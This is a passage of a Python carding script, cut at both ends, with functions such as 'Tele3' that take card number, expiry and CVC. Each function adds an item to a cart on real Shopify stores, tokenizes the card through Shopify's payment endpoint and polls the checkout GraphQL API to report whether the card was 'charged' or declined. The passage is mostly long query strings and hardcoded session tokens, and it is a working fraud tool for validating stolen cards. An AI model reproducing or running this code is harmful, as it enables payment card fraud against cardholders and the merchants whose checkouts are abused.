StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}...on RedeemablePaymentMethod{redemptionSource redemptionContent{...on CustomRedemptionContent{redemptionAttributes{key value __typename}maskedIdentifier paymentMethodIdentifier __typename}...on StoreCreditRedemptionContent{storeCreditAccountId __typename}__typename}__typename}...on CustomOnsitePaymentMethod{paymentMethodIdentifier name __typename}__typename}__typename}__typename}__typename}buyerIdentity{...on PurchaseOrderBuyerIdentityTerms{contactMethod{...on PurchaseOrderEmailContactMethod{email __typename}...on PurchaseOrderSMSContactMethod{phoneNumber __typename}__typename}marketingConsent{...on PurchaseOrderEmailContactMethod{email __typename}...on PurchaseOrderSMSContactMethod{phoneNumber __typename}__typename}__typename}customer{__typename...on GuestProfile{presentmentCurrency countryCode market{id handle __typename}__typename}...on DecodedCustomerProfile{id presentmentCurrency fullName firstName lastName countryCode email imageUrl acceptsMarketing acceptsSmsMarketing acceptsEmailMarketing ordersCount phone __typename}...on BusinessCustomerProfile{checkoutExperienceConfiguration{editableShippingAddress __typename}id presentmentCurrency fullName firstName lastName acceptsMarketing acceptsSmsMarketing acceptsEmailMarketing countryCode imageUrl email ordersCount phone market{id handle __typename}__typename}}purchasingCompany{company{id externalId name __typename}contact{locationCount __typename}location{id externalId name deposit __typename}__typename}__typename}merchandise{taxesIncluded merchandiseLines{stableId legacyFee merchandise{...ProductVariantSnapshotMerchandiseDetails __typename}lineAllocations{checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}quantity stableId totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}totalAmountBeforeReductions{amount currencyCode __typename}discountAllocations{__typename amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}}unitPrice{measurement{referenceUnit referenceValue __typename}price{amount currencyCode __typename}__typename}__typename}lineComponents{...PurchaseOrderBundleLineComponent __typename}quantity{__typename...on PurchaseOrderMerchandiseQuantityByItem{items __typename}}recurringTotal{fixedPrice{__typename amount currencyCode}fixedPriceCount interval intervalCount recurringPrice{__typename amount currencyCode}title __typename}lineAmount{__typename amount currencyCode}__typename}__typename}tax{totalTaxAmountV2{__typename amount currencyCode}totalDutyAmount{amount currencyCode __typename}totalTaxAndDutyAmount{amount currencyCode __typename}totalAmountIncludedInTarget{amount currencyCode __typename}__typename}discounts{lines{...PurchaseOrderDiscountLineFragment __typename}__typename}legacyRepresentProductsAsFees totalSavings{amount currencyCode __typename}subtotalBeforeTaxesAndShipping{amount currencyCode __typename}legacySubtotalBeforeTaxesShippingAndFees{amount currencyCode __typename}legacyAggregatedMerchandiseTermsAsFees{title description total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}landedCostDetails{incotermInformation{incoterm reason __typename}__typename}optionalDuties{buyerRefusesDuties refuseDutiesPermitted __typename}dutiesIncluded tip{tipLines{amount{amount currencyCode __typename}__typename}__typename}hasOnlyDeferredShipping note{customAttributes{key value __typename}message __typename}shopPayArtifact{optIn{vaultPhone __typename}__typename}recurringTotals{fixedPrice{amount currencyCode __typename}fixedPriceCount interval intervalCount recurringPrice{amount currencyCode __typename}title __typename}checkoutTotalBeforeTaxesAndShipping{__typename amount currencyCode}checkoutTotal{__typename amount currencyCode}checkoutTotalTaxes{__typename amount currencyCode}subtotalBeforeReductions{__typename amount currencyCode}deferredTotal{amount{__typename...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}dueAt subtotalAmount{__typename...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}taxes{__typename...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}__typename}metafields{key namespace value valueType:type __typename}}fragment ProductVariantSnapshotMerchandiseDetails on ProductVariantSnapshot{variantId options{name value __typename}productTitle title productUrl untranslatedTitle untranslatedSubtitle sellingPlan{name id digest deliveriesPerBillingCycle prepaid subscriptionDetails{billingInterval billingIntervalCount billingMaxCycles deliveryInterval deliveryIntervalCount __typename}__typename}deferredAmount{amount currencyCode __typename}digest giftCard image{altText one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}price{amount currencyCode __typename}productId productType properties{...MerchandiseProperties __typename}requiresShipping sku taxCode taxable vendor weight{unit value __typename}__typename}fragment MerchandiseProperties on MerchandiseProperty{name value{...on MerchandisePropertyValueString{string:value __typename}...on MerchandisePropertyValueInt{int:value __typename}...on MerchandisePropertyValueFloat{float:value __typename}...on MerchandisePropertyValueBoolean{boolean:value __typename}...on MerchandisePropertyValueJson{json:value __typename}__typename}visible __typename}fragment DiscountDetailsFragment on Discount{...on CustomDiscount{title description presentationLevel allocationMethod targetSelection targetType signature signatureUuid type value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}...on CodeDiscount{title code presentationLevel allocationMethod message targetSelection targetType value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}...on DiscountCodeTrigger{code __typename}...on AutomaticDiscount{presentationLevel title allocationMethod message targetSelection targetType value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}__typename}fragment PurchaseOrderBundleLineComponent on PurchaseOrderBundleLineComponent{stableId merchandise{...ProductVariantSnapshotMerchandiseDetails __typename}lineAllocations{checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}quantity stableId totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}totalAmountBeforeReductions{amount currencyCode __typename}discountAllocations{__typename amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index}unitPrice{measurement{referenceUnit referenceValue __typename}price{amount currencyCode __typename}__typename}__typename}quantity recurringTotal{fixedPrice{__typename amount currencyCode}fixedPriceCount interval intervalCount recurringPrice{__typename amount currencyCode}title __typename}totalAmount{__typename amount currencyCode}__typename}fragment PurchaseOrderDiscountLineFragment on PurchaseOrderDiscountLine{discount{...DiscountDetailsFragment __typename}lineAmount{amount currencyCode __typename}deliveryAllocations{amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index stableId targetType __typename}merchandiseAllocations{amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index stableId targetType __typename}__typename}','variables': {'receiptId': 'gid://shopify/ProcessedReceipt/1505710342338','sessionToken': 'MTk3c2EzTWhpb1lyeWtnaFA5QlhDc29nTjRKUzNxeEJqMkZ3QkNjVnRVT0kvVk1Gcm84ckV0VXBJTzVaY2hHaHRXak5kWWY0NGxnYW4xS2U4dE9NNmM5dkplNE1ISnd0Q29aZ1IyTWNTU2cvTURPc00yVWNUaGhoS21WQzBmRzZOOW9IZE85RHBTU3ZmR1dRVC9SWFBPVHg5MnRjMElWUDhlV1M0aVRyeHpCdzM2NTk1MkhZMkRlSEIvZ25jWm42VDZJQ0d6eitsVkxneVZQTk9GbWpQdm95bVV5LzBnb1U2cW5uYWVidG9oeHBFRktxYUl6S1RuVTJ0cVNjSjdiVnU2aUFwSjhxNTdpNVlQZUpzdCs1U2FYTmxqblN1NUtLVjVJaS0tRGh3aktjMi9yZ2V6dHdiMC0tOHV3MXExUVY4Z1hoTk5qT21URDR1dz09',},'operationName': 'PollForReceipt',}
	response = r.post('https://wiredministries.com/checkouts/unstable/graphql', params=params, cookies=r.cookies, headers=headers, json=json_data)
	
	msg=response.text		    			   
	match=re.search(r'"code":"(.*?)"', msg)
	if match:
		mssgg = match.group(1)		
		return mssgg
	else:
		return 'charged'	

def Tele3(ccx):
	import requests
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:
		yy = yy.split("20")[1]
	r = requests.session()	
	headers = {
    'authority': 'allamericanroughneck.com',
    'accept': 'application/javascript',
    'accept-language': 'en-US,en;q=0.9',
    'content-type': 'multipart/form-data; boundary=----WebKitFormBoundaryNElqs53N46kvafdd',    
    'origin': 'https://allamericanroughneck.com',
    'referer': 'https://allamericanroughneck.com/collections/golf/products/aar-golf-tee-bag-ball-marker',
    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
}
	files = {
    'form_type': (None, 'product'), 
    'id': (None, '43174029852823'),
    'quantity': (None, '1'),
    'product-id': (None, '8027808956567'),
    'section-id': (None, 'template--17846771941527__main'),
    'sections_url': (None, '/collections/golf/products/aar-golf-tee-bag-ball-marker'),
    'sections': (None, 'cart-icon-bubble,sections--17846771548311__cart-drawer'),
}
	response = r.post('https://allamericanroughneck.com/cart/add', cookies=r.cookies, headers=headers, files=files)
	headers = {
    'authority': 'allamericanroughneck.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'max-age=0',
    'content-type': 'application/x-www-form-urlencoded',    
    'origin': 'https://allamericanroughneck.com',
    'referer': 'https://allamericanroughneck.com/collections/golf/products/aar-golf-tee-bag-ball-marker',
    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
}
	data = {
    'updates[]': '1',
    'note': '',
    'checkout': '',
}
	response = r.post('https://allamericanroughneck.com/cart', cookies=r.cookies, headers=headers, data=data)
	headers = {
    'authority': 'checkout.pci.shopifyinc.com',
    'accept': 'application/json',
    'accept-language': 'en-US,en;q=0.9',
    'content-type': 'application/json',
    'origin': 'https://checkout.pci.shopifyinc.com',
    'referer': 'https://checkout.pci.shopifyinc.com/build/75a428d/number-ltr.html?identifier=&locationURL=',
    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
}
	json_data = {
    'credit_card': {
        'number': n,
        'month': mm,
        'year': yy,
        'verification_value': cvc,
        'start_month': None,
        'start_year': None,
        'issue_number': '',
        'name': 'Jhon Cena Tera daddy',
    },
    'payment_session_scope': 'allamericanroughneck.com',
}
	iddd = requests.post('https://deposit.shopifycs.com/sessions', headers=headers, json=json_data).json()['id']
	print(iddd)
	headers = {
    'authority': 'allamericanroughneck.com',
    'accept': 'application/json',
    'accept-language': 'en-US',
    'content-type': 'application/json',    
    'origin': 'https://allamericanroughneck.com',
    'referer': 'https://allamericanroughneck.com/',
    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'shopify-checkout-client': 'checkout-web/1.0',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
    'x-checkout-one-session-token': 'eFdNVVBZZ1pLZUt5akJwT1FGc0ZtM1hXMVFWTkNGbHRKdG4vd3Y4ZEIyWFlyUXk3aWJQTkRWYmt1b2QzWk9aRTN5SDk2VFF4MGJHREZmMzhiZHNXMXgzM2Fibnl0ZFdLNmg5T09aaFVDSi9SZ0lVcVpuVmRwWHlRQ1AycVJwMTZVZGNCSHN3WXhjc2FSZERxQ2tEMmNvS2MwclloUGY1NkZxNENxYUQ1RzVib2lCRlVXTkxjYno0OTdRRHNjaWlidGJNQzk0TmdNRm96dWVzNFV5VGtBcWNub0hMak4ySU9yd3RuUXN6ekxqMmlGamQySHg2dkE0L1BacXZCc0VqOGRjSGgxZng4d1BqY1hRcnAvRUd4V255aDZZNXZrRFVlOTZ0dkkwTHE5UzFVdzZmRVQxTE5IKzQ9LS15ZE5xT1NHTTVrcnVMNnBiLS0yYWg3ZGRtSCtKdTdldW9sdVFSUkx3PT0',
    'x-checkout-web-build-id': iddd,
    'x-checkout-web-deploy-stage': 'production',
    'x-checkout-web-server-handling': 'fast',
    'x-checkout-web-server-rendering': 'yes',
    'x-checkout-web-source-id': 'Z2NwLWFzaWEtc291dGhlYXN0MTowMUpRTlBENDNCVzhXOUE3WFFRSlhQWEVRNw',
}
	params = {
    'operationName': 'PollForReceipt',
}
	
	json_data = {
    'query': 'query PollForReceipt($receiptId:ID!,$sessionToken:String!){receipt(receiptId:$receiptId,sessionInput:{sessionToken:$sessionToken}){...ReceiptDetails __typename}}fragment ReceiptDetails on Receipt{...on ProcessedReceipt{id token redirectUrl confirmationPage{url shouldRedirect __typename}orderStatusPageUrl shopPay shopPayInstallments analytics{checkoutCompletedEventId emitConversionEvent __typename}poNumber orderIdentity{buyerIdentifier id __typename}customerId isFirstOrder eligibleForMarketingOptIn purchaseOrder{...ReceiptPurchaseOrder __typename}orderCreationStatus{__typename}paymentDetails{paymentCardBrand creditCardLastFourDigits paymentAmount{amount currencyCode __typename}paymentGateway financialPendingReason paymentDescriptor buyerActionInfo{...on MultibancoBuyerActionInfo{entity reference __typename}__typename}__typename}shopAppLinksAndResources{mobileUrl qrCodeUrl canTrackOrderUpdates shopInstallmentsViewSchedules shopInstallmentsMobileUrl installmentsHighlightEligible mobileUrlAttributionPayload shopAppEligible shopAppQrCodeKillswitch shopPayOrder payEscrowMayExist buyerHasShopApp buyerHasShopPay orderUpdateOptions __typename}postPurchasePageUrl postPurchasePageRequested postPurchaseVaultedPaymentMethodStatus paymentFlexibilityPaymentTermsTemplate{__typename dueDate dueInDays id translatedName type}__typename}...on ProcessingReceipt{id purchaseOrder{...ReceiptPurchaseOrder __typename}pollDelay __typename}...on WaitingReceipt{id pollDelay __typename}...on ActionRequiredReceipt{id action{...on CompletePaymentChallenge{offsiteRedirect url __typename}...on CompletePaymentChallengeV2{challengeType challengeData __typename}__typename}timeout{millisecondsRemaining __typename}__typename}...on FailedReceipt{id processingError{...on InventoryClaimFailure{__typename}...on InventoryReservationFailure{__typename}...on OrderCreationFailure{paymentsHaveBeenReverted __typename}...on OrderCreationSchedulingFailure{__typename}...on PaymentFailed{code messageUntranslated hasOffsitePaymentMethod __typename}...on DiscountUsageLimitExceededFailure{__typename}...on CustomerPersistenceFailure{__typename}__typename}__typename}__typename}fragment ReceiptPurchaseOrder on PurchaseOrder{__typename sessionToken totalAmountToPay{amount currencyCode __typename}checkoutCompletionTarget delivery{...on PurchaseOrderDeliveryTerms{splitShippingToggle deliveryLines{__typename availableOn deliveryStrategy{handle title description methodType brandedPromise{handle logoUrl lightThemeLogoUrl darkThemeLogoUrl lightThemeCompactLogoUrl darkThemeCompactLogoUrl name __typename}pickupLocation{...on PickupInStoreLocation{name address{address1 address2 city countryCode zoneCode postalCode phone coordinates{latitude longitude __typename}__typename}instructions __typename}...on PickupPointLocation{address{address1 address2 address3 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}__typename}carrierCode carrierName name carrierLogoUrl fromDeliveryOptionGenerator __typename}__typename}deliveryPromisePresentmentTitle{short long __typename}deliveryStrategyBreakdown{__typename amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}discountRecurringCycleLimit excludeFromDeliveryOptionPrice targetMerchandise{...on PurchaseOrderMerchandiseLine{stableId quantity{...on PurchaseOrderMerchandiseQuantityByItem{items __typename}__typename}merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}legacyFee __typename}...on PurchaseOrderBundleLineComponent{stableId quantity merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}__typename}__typename}}__typename}lineAmount{amount currencyCode __typename}lineAmountAfterDiscounts{amount currencyCode __typename}destinationAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}__typename}groupType targetMerchandise{...on PurchaseOrderMerchandiseLine{stableId quantity{...on PurchaseOrderMerchandiseQuantityByItem{items __typename}__typename}merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}legacyFee __typename}...on PurchaseOrderBundleLineComponent{stableId quantity merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}__typename}__typename}}__typename}__typename}deliveryExpectations{__typename brandedPromise{name logoUrl handle lightThemeLogoUrl darkThemeLogoUrl __typename}deliveryStrategyHandle deliveryExpectationPresentmentTitle{short long __typename}returnability{returnable __typename}}payment{...on PurchaseOrderPaymentTerms{billingAddress{__typename...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}}paymentLines{amount{amount currencyCode __typename}postPaymentMessage dueAt due{...on PaymentLineDueEvent{event __typename}...on PaymentLineDueTime{time __typename}__typename}paymentMethod{...on DirectPaymentMethod{sessionId paymentMethodIdentifier vaultingAgreement creditCard{brand lastDigits __typename}billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on CustomerCreditCardPaymentMethod{brand displayLastDigits token deletable defaultPaymentMethod requiresCvvConfirmation firstDigits billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}...on PurchaseOrderGiftCardPaymentMethod{balance{amount currencyCode __typename}code __typename}...on WalletPaymentMethod{name walletContent{...on ShopPayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}sessionToken paymentMethodIdentifier paymentMethod paymentAttributes __typename}...on PaypalWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}email payerId token expiresAt __typename}...on ApplePayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}data signature version __typename}...on GooglePayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}signature signedMessage protocolVersion __typename}...on FacebookPayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}containerData containerId mode __typename}...on ShopifyInstallmentsWalletContent{autoPayEnabled billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}disclosureDetails{evidence id type __typename}installmentsToken sessionToken creditCard{brand lastDigits __typename}__typename}__typename}__typename}...on WalletsPlatformPaymentMethod{name walletParams __typename}...on LocalPaymentMethod{paymentMethodIdentifier name displayName billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}additionalParameters{...on IdealPaymentMethodParameters{bank __typename}__typename}__typename}...on PaymentOnDeliveryMethod{additionalDetails paymentInstructions paymentMethodIdentifier billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on OffsitePaymentMethod{paymentMethodIdentifier name billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on ManualPaymentMethod{additionalDetails name paymentInstructions id paymentMethodIdentifier billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on CustomPaymentMethod{additionalDetails name paymentInstructions id paymentMethodIdentifier billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on DeferredPaymentMethod{orderingIndex displayName __typename}...on PaypalBillingAgreementPaymentMethod{token billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}...on RedeemablePaymentMethod{redemptionSource redemptionContent{...on ShopCashRedemptionContent{redemptionPaymentOptionKind billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}__typename}redemptionId details{redemptionId sourceAmount{amount currencyCode __typename}destinationAmount{amount currencyCode __typename}redemptionType __typename}__typename}...on CustomRedemptionContent{redemptionAttributes{key value __typename}maskedIdentifier paymentMethodIdentifier __typename}...on StoreCreditRedemptionContent{storeCreditAccountId __typename}__typename}__typename}...on CustomOnsitePaymentMethod{paymentMethodIdentifier name __typename}__typename}__typename}__typename}__typename}buyerIdentity{...on PurchaseOrderBuyerIdentityTerms{contactMethod{...on PurchaseOrderEmailContactMethod{email __typename}...on PurchaseOrderSMSContactMethod{phoneNumber __typename}__typename}marketingConsent{...on PurchaseOrderEmailContactMethod{email __typename}...on PurchaseOrderSMSContactMethod{phoneNumber __typename}__typename}__typename}customer{__typename...on GuestProfile{presentmentCurrency countryCode market{id handle __typename}__typename}...on DecodedCustomerProfile{id presentmentCurrency fullName firstName lastName countryCode email imageUrl acceptsSmsMarketing acceptsEmailMarketing ordersCount phone __typename}...on BusinessCustomerProfile{checkoutExperienceConfiguration{editableShippingAddress __typename}id presentmentCurrency fullName firstName lastName acceptsSmsMarketing acceptsEmailMarketing countryCode imageUrl email ordersCount phone market{id handle __typename}__typename}}purchasingCompany{company{id externalId name __typename}contact{locationCount __typename}location{id externalId name __typename}__typename}__typename}merchandise{taxesIncluded merchandiseLines{stableId legacyFee merchandise{...ProductVariantSnapshotMerchandiseDetails __typename}lineAllocations{checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}quantity stableId totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}totalAmountBeforeReductions{amount currencyCode __typename}discountAllocations{__typename amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}}unitPrice{measurement{referenceUnit referenceValue __typename}price{amount currencyCode __typename}__typename}__typename}lineComponents{...PurchaseOrderBundleLineComponent __typename}quantity{__typename...on PurchaseOrderMerchandiseQuantityByItem{items __typename}}recurringTotal{fixedPrice{__typename amount currencyCode}fixedPriceCount interval intervalCount recurringPrice{__typename amount currencyCode}title __typename}lineAmount{__typename amount currencyCode}__typename}__typename}tax{totalTaxAmountV2{__typename amount currencyCode}totalDutyAmount{amount currencyCode __typename}totalTaxAndDutyAmount{amount currencyCode __typename}totalAmountIncludedInTarget{amount currencyCode __typename}__typename}discounts{lines{...PurchaseOrderDiscountLineFragment __typename}__typename}legacyRepresentProductsAsFees totalSavings{amount currencyCode __typename}subtotalBeforeTaxesAndShipping{amount currencyCode __typename}legacySubtotalBeforeTaxesShippingAndFees{amount currencyCode __typename}legacyAggregatedMerchandiseTermsAsFees{title description total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}landedCostDetails{incotermInformation{incoterm reason __typename}__typename}optionalDuties{buyerRefusesDuties refuseDutiesPermitted __typename}dutiesIncluded tip{tipLines{amount{amount currencyCode __typename}__typename}__typename}hasOnlyDeferredShipping note{customAttributes{key value __typename}message __typename}shopPayArtifact{optIn{vaultPhone __typename}__typename}recurringTotals{fixedPrice{amount currencyCode __typename}fixedPriceCount interval intervalCount recurringPrice{amount currencyCode __typename}title __typename}checkoutTotalBeforeTaxesAndShipping{__typename amount currencyCode}checkoutTotal{__typename amount currencyCode}checkoutTotalTaxes{__typename amount currencyCode}subtotalBeforeReductions{__typename amount currencyCode}deferredTotal{amount{__typename...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}dueAt subtotalAmount{__typename...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}taxes{__typename...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}__typename}metafields{key namespace value valueType:type __typename}}fragment ProductVariantSnapshotMerchandiseDetails on ProductVariantSnapshot{variantId options{name value __typename}productTitle title productUrl untranslatedTitle untranslatedSubtitle sellingPlan{name id digest deliveriesPerBillingCycle prepaid subscriptionDetails{billingInterval billingIntervalCount billingMaxCycles deliveryInterval deliveryIntervalCount __typename}__typename}deferredAmount{amount currencyCode __typename}digest giftCard image{altText one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}price{amount currencyCode __typename}productId productType properties{...MerchandiseProperties __typename}requiresShipping sku taxCode taxable vendor weight{unit value __typename}__typename}fragment MerchandiseProperties on MerchandiseProperty{name value{...on MerchandisePropertyValueString{string:value __typename}...on MerchandisePropertyValueInt{int:value __typename}...on MerchandisePropertyValueFloat{float:value __typename}...on MerchandisePropertyValueBoolean{boolean:value __typename}...on MerchandisePropertyValueJson{json:value __typename}__typename}visible __typename}fragment DiscountDetailsFragment on Discount{...on CustomDiscount{title description presentationLevel allocationMethod targetSelection targetType signature signatureUuid type value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}...on CodeDiscount{title code presentationLevel allocationMethod message targetSelection targetType value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}...on DiscountCodeTrigger{code __typename}...on AutomaticDiscount{presentationLevel title allocationMethod message targetSelection targetType value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}__typename}fragment PurchaseOrderBundleLineComponent on PurchaseOrderBundleLineComponent{stableId merchandise{...ProductVariantSnapshotMerchandiseDetails __typename}lineAllocations{checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}quantity stableId totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}totalAmountBeforeReductions{amount currencyCode __typename}discountAllocations{__typename amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index}unitPrice{measurement{referenceUnit referenceValue __typename}price{amount currencyCode __typename}__typename}__typename}quantity recurringTotal{fixedPrice{__typename amount currencyCode}fixedPriceCount interval intervalCount recurringPrice{__typename amount currencyCode}title __typename}totalAmount{__typename amount currencyCode}__typename}fragment PurchaseOrderDiscountLineFragment on PurchaseOrderDiscountLine{discount{...DiscountDetailsFragment __typename}lineAmount{amount currencyCode __typename}deliveryAllocations{amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index stableId targetType __typename}merchandiseAllocations{amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index stableId targetType __typename}__typename}',
    'variables': {
        'receiptId': 'gid://shopify/ProcessedReceipt/1908590313623',
        'sessionToken': 'eFdNVVBZZ1pLZUt5akJwT1FGc0ZtM1hXMVFWTkNGbHRKdG4vd3Y4ZEIyWFlyUXk3aWJQTkRWYmt1b2QzWk9aRTN5SDk2VFF4MGJHREZmMzhiZHNXMXgzM2Fibnl0ZFdLNmg5T09aaFVDSi9SZ0lVcVpuVmRwWHlRQ1AycVJwMTZVZGNCSHN3WXhjc2FSZERxQ2tEMmNvS2MwclloUGY1NkZxNENxYUQ1RzVib2lCRlVXTkxjYno0OTdRRHNjaWlidGJNQzk0TmdNRm96dWVzNFV5VGtBcWNub0hMak4ySU9yd3RuUXN6ekxqMmlGamQySHg2dkE0L1BacXZCc0VqOGRjSGgxZng4d1BqY1hRcnAvRUd4V255aDZZNXZrRFVlOTZ0dkkwTHE5UzFVdzZmRVQxTE5IKzQ9LS15ZE5xT1NHTTVrcnVMNnBiLS0yYWg3ZGRtSCtKdTdldW9sdVFSUkx3PT0',
    },
    'operationName': 'PollForReceipt',
}
	response = requests.post(
